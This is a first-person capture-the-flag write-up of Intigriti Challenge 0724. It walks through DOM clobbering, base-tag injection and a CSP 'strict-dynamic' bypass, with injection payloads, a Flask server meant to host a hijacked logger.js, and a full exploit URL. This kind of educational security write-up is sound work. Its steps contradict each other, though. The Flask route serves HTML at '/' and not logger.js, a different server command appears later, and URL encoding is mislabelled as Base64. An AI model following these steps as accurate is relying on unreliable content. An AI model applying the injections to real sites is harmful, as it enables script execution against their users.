# Intigriti Challenge 0724 - Complete Write-up & Exploit

## Overview

This write-up explains how I solved the Intigriti Challenge 0724, a web security CTF involving bypassing a strict Content Security Policy (CSP) and exploiting DOM behavior to execute JavaScript in the victim’s browser.

The main goal was to bypass CSP restrictions, hijack a dynamically loaded script (`logger.js`), and run `alert(document.domain)` without any user interaction.

---

## Step-by-Step Exploit Breakdown

### 1. Understanding the Challenge

- The vulnerable web page sanitizes user input (`memo` parameter).
- If sanitization fails (due to malformed input), it loads a `logger.js` script dynamically.
- The page only enables “development mode” (`isDevelopment` flag) when running on `localhost`.
- CSP uses `'strict-dynamic'` with script hashes, restricting which scripts can run.

---

### 2. Bypassing `isDevelopment` with DOM Clobbering

Normally, the `isDevelopment` variable is `true` only on localhost, blocking our exploit on the challenge server.

I injected:

```html
<form id="isDevelopment">
```
This creates a global DOM element with the ID isDevelopment that overwrites the JavaScript variable of the same name with a truthy object, tricking the site into enabling dev mode regardless of origin.
### 3. Hijacking Script Loading with the <base> Tag
The site dynamically loads ./logger.js relative to the page.
I injected:
```html
<base href="http://127.0.0.1:8000/">
```
This tag changes the base URL for relative paths, making the browser load logger.js from my own server instead of the challenge’s domain.
### 4. Crafting Malformed Input to Trigger Sanitizer Error
By combining the two injections:
```html
<base href="http://127.0.0.1:8000/"><form id="isDevelopment">
```
the input breaks the sanitizer, causing it to throw an error and load logger.js dynamically.
### 5. Hosting Malicious logger.js on a Local Flask Server
To serve the malicious script, I wrote this Python Flask server:
```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Document Domain Alert</title>
    </head>
    <body>
        <h1>Welcome to Flask</h1>
        <script>
            alert(document.domain);
        </script>
    </body>
    </html>
    ''')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000,debug=True)

```
- This serves a JavaScript file at http://127.0.0.1:8000/logger.js.
- The file contains alert(document.domain); which will pop up the domain of the vulnerable page.
### 6. Running the Local Server
To start the server via:
```pyhton
python3 -m http.server 8000
```
### 7. Full Exploit URL Base 64 encode.
```url
https://challenge-0724.intigriti.io/challenge/index.html?memo=%3Cbase%20href%3D%22http%3A%2F%2F127.0.0.1%3A8000%2F%22%3E%3Cform%20id%3D%22isDevelopment%22%3E

```
When visiting this URL:
- The sanitizer throws an error on the malformed input.
- Dev mode is enabled by the DOM clobbering.
- The page dynamically loads logger.js from my Flask server.
- The browser executes alert(document.domain); under the challenge domain context.

### 8. Result
An alert box pops up showing:
```go
challenge-0724.intigriti.io
```
I have Provided the screenshot.
This confirms the CSP bypass and successful remote script execution.

---

##  Personal Reflection

When I first saw this challenge, I felt overwhelmed. I had never dealt with advanced CSP, DOM clobbering, or dynamic script injection before. It all seemed complicated and out of reach.

But instead of giving up, I started breaking down each part — inch by inch. I studied how the base tag works, what CSP `'strict-dynamic'` really means, and how browsers treat malformed HTML. I spent hours experimenting, failing, tweaking, and finally — it clicked.

And when I saw that **`alert(document.domain)`** pop up...  
I froze.  
Then I smiled.  

> I didn’t just solve a CTF — I understood the web a little deeper.  
> I didn’t just hack a page — I hacked my own limitations.

This was my **first CTF** — and now, I’m not afraid of the next one. In fact, I can’t wait.

---

##  Final Words

> “You don't grow when things are easy. You grow when you face challenges that feel impossible — and solve them anyway.”  
> — Mohamed Sadik


### Lessons Learned
- DOM Clobbering: Overriding JavaScript variables with DOM elements.

- Base Tag Injection: Changing base URL to hijack relative resource loading.

- CSP Bypass: Leveraging 'strict-dynamic' to allow trusted dynamic scripts.

- Sanitizer Abuse: Causing errors to trigger fallback script loading.

- Hosting Malicious JS: Serving payloads to hijacked script URLs.

### Disclaimer
This write-up is for educational purposes and authorized (By Intigriti Challenge 0724) challenges only. Do not attempt unauthorized attacks.
### Contact
Feel free to reach out for questions or collaboration.
- Mail: mwmsadik@gmail.com
- Mohamed Sadik
- **Don't just code it. Understand it. Break it. Rebuild it better.**
